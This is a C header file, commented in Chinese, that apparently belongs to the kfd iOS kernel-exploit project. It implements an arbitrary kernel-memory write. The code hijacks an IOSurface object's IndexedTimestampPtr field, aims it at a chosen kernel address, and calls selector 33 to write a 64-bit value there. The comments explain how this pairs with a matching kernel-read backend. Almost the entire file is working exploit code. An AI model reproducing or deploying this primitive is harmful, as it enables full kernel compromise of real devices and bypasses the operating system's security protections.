/*
 * kwrite_IOSurface.h —— IOSurface 的写后端，必须与 kread_IOSurface 成对。
 *
 * 为什么不能像 kwrite_sem_open 那样"搭 kread 的车"：
 *   kwrite_sem_open 把 krkw_method_data 直接指向 kread 的缓冲，而两者的元素
 *   形状不同 —— sem_open 后端每项是 i32（文件描述符），IOSurface 后端每项是
 *   u64（surface_id）。混用时 deallocate 会把 u64 的 surface_id 当 fd 去 close()，
 *   free 也会用错误的 size 释放。opa334 的 kwrite_IOSurface.h 开头就写了这件事：
 *       "I attempted to make this standalone from kread but that probably doesn't
 *        work, so just select IOSurface for both kread and kwrite"
 *
 * 所以这个后端的形状与 opa334 一致：**纯 piggyback**，不另开缓冲，
 * 全部读写都走同一个 IOSurface 对象。
 *
 * 写路径与读路径对称：
 *   读：改 UseCountPtr  →  kaddr - ReadDisplacement  →  iosurface_get_use_count
 *   写：改 IndexedTimestampPtr  →  kaddr              →  set_indexed_timestamp
 *
 * 写路径不需要减去位移——`IndexedTimestampPtr` 的语义就是"目标地址本身"，
 * 而 `ReadDisplacement` 是读通道的补偿量，两者是不同字段。
 */

#ifndef kwrite_IOSurface_h
#define kwrite_IOSurface_h

#include "../kread/kread_IOSurface.h"

void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value);

void kwrite_IOSurface_init(struct kfd* kfd)
{
    /*
     * 与 opa334 同样的守卫：kread 那边已经把 IOSurface 对象建好了，
     * 这里只在"kread 不是 IOSurface"时才去补初始化（那种组合本身就不该出现，
     * 属于防御）。正常路径下这个函数什么都不做 —— 也正因如此，
     * krkw_helper_init 对 write 侧的调用是幂等的。
     */
    if (kfd->kread.krkw_method_ops.init != kread_IOSurface_init) {
        kread_IOSurface_init(kfd);
    }
}

void kwrite_IOSurface_allocate(struct kfd* kfd, u64 id)
{
    if (kfd->kread.krkw_method_ops.allocate != kread_IOSurface_allocate) {
        kread_IOSurface_allocate(kfd, id);
    }
}

bool kwrite_IOSurface_search(struct kfd* kfd, u64 object_uaddr)
{
    if (kfd->kread.krkw_method_ops.search != kread_IOSurface_search) {
        return kread_IOSurface_search(kfd, object_uaddr);
    }
    /* kread 已经认领过这个对象，写侧直接复用 */
    return true;
}

void kwrite_IOSurface_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kwrite_from_method(u64, kwrite_IOSurface_kwrite_u64);
}

void kwrite_IOSurface_find_proc(struct kfd* kfd)
{
    /* kread 负责反查 current_proc / kernel_proc，写侧不重复做。 */
    return;
}

void kwrite_IOSurface_deallocate(struct kfd* kfd, u64 id)
{
    if (kfd->kread.krkw_method_ops.deallocate != kread_IOSurface_deallocate) {
        kread_IOSurface_deallocate(kfd, id);
    }
}

void kwrite_IOSurface_free(struct kfd* kfd)
{
    if (kfd->kread.krkw_method_ops.free != kread_IOSurface_free) {
        kread_IOSurface_free(kfd);
    }
}

/*
 * 64 位写。
 *
 * 备份 IndexedTimestampPtr → 改成目标内核地址 → 调 selector 33 写值 → 还原。
 * 还原是必须的：这个字段留在目标地址上会让 IOSurface 对象自身处于损坏状态，
 * 后续任何一次 release_surface 或对象复用都可能踩到它。
 */
void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
{
    u64 iosurface_uaddr = kfd->kread.krkw_object_uaddr;
    u64* surface_ids = (u64*)(kfd->kread.krkw_method_data);

    volatile u64* ts_ptr = (volatile u64*)(iosurface_uaddr
                                           + dynamic_info(ios__IndexedTimestampPtr));
    u64 backup = *ts_ptr;
    *ts_ptr = kaddr;

    set_indexed_timestamp(g_surface_connect,
                          (u32)surface_ids[kfd->kread.krkw_object_id],
                          0, new_value);

    *ts_ptr = backup;
}

#endif /* kwrite_IOSurface_h */
